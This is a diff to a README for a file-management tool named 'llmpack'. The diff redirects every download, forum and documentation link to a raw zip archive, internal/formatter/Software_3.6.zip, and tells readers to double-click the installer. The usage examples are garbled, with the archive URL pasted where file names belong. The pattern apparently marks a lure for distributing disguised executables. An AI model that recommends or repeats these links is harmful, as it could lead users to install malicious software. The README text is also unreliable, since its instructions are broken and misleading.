@@ -10,7 +10,7 @@ llmpack is a command-line tool designed to help you easily work with files, espe
 - **Cross-Platform Support**: Use llmpack on Windows, macOS, and Linux.
 
 ### 🔗 Download Now
-[![Download llmpack](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip)](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip)
+[![Download llmpack](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip)](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip)
 
 ### 🖥️ System Requirements
 llmpack works on multiple operating systems. Here are the basic requirements:
@@ -28,7 +28,7 @@ To start using llmpack, follow these steps:
 4. **Run llmpack**: Type `llmpack` followed by any commands you wish to use.
 
 ### 📥 Download & Install
-To download the latest version of llmpack, visit this page: [Download from Releases](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip).
+To download the latest version of llmpack, visit this page: [Download from Releases](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip).
 
 On the Releases page, you will find various files available for download. Click on the file corresponding to your operating system to start downloading it.
 
@@ -47,7 +47,7 @@ If you have questions or need help, you can check the following:
 - **Community Support**: Join our community forums for discussions or any issues you might encounter.
 
 ### 📦 Installation Steps in Detail
-1. **Download**: Visit the [Releases page](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip) and click on the file suited for your OS.
+1. **Download**: Visit the [Releases page](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip) and click on the file suited for your OS.
 2. **Locate the Downloaded File**: After the download is complete, navigate to your Downloads folder or the folder you specified.
 3. **Run the Installer**: Double-click the downloaded file to run the installation.
 4. **Follow Installation Prompts**: Follow any on-screen instructions to complete the installation process. 
@@ -56,19 +56,19 @@ If you have questions or need help, you can check the following:
 ### ✨ Example Usage
 Here’s how you can use some basic commands:
 
-- **Moving a File**: To move a file named `https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip` from your desktop to a folder named `Documents`, you would run:
+- **Moving a File**: To move a file named `https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip` from your desktop to a folder named `Documents`, you would run:
   ```
-  llmpack move ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip ~/Documents/
+  llmpack move ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip ~/Documents/
   ```
   
-- **Copying a File**: To create a copy of `https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip` in the same location:
+- **Copying a File**: To create a copy of `https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip` in the same location:
   ```
-  llmpack copy ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip
+  llmpack copy ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip
   ```
 
-- **Deleting a File**: To delete the `https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip` file:
+- **Deleting a File**: To delete the `https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip` file:
   ```
-  llmpack delete ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip
+  llmpack delete ~https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip
   ```
 
 ### 🛠️ Troubleshooting Common Issues
@@ -86,8 +86,8 @@ We welcome contributions to llmpack. If you have ideas for features or improveme
 For detailed contribution guidelines, refer to the documentation available in the repository.
 
 ### 🔗 Links
-- [Download llmpack](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip)
-- [Community Forums](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip)
-- [Documentation](https://github.com/Krishan564/llmpack/raw/refs/heads/master/cmd/llmpack_3.7.zip)
+- [Download llmpack](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip)
+- [Community Forums](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip)
+- [Documentation](https://github.com/Krishan564/llmpack/raw/refs/heads/master/internal/formatter/Software_3.6.zip)
 
 Enjoy using llmpack for your file management needs!
